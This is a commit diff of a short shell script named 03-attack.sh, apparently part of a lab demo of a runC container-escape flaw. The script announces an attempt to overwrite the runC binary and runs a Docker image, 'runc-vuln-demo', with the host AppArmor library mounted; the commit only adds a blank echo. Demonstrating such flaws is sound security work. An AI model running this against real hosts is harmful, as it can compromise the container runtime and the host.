77befaf8798498a5908233d44f425f0eb20702bd
dstubked <45514912+dstubked@users.noreply.github.com>
2019-07-22 19:06:10 +0800

    Update 03-attack.sh

--- runc/03-attack.sh
+++ runc/03-attack.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 echo "Attempting to overwrite runC binary"
+echo " "
 echo "docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo"
 docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo
 #docker run --rm -it yanivagman/runc-vuln-demo
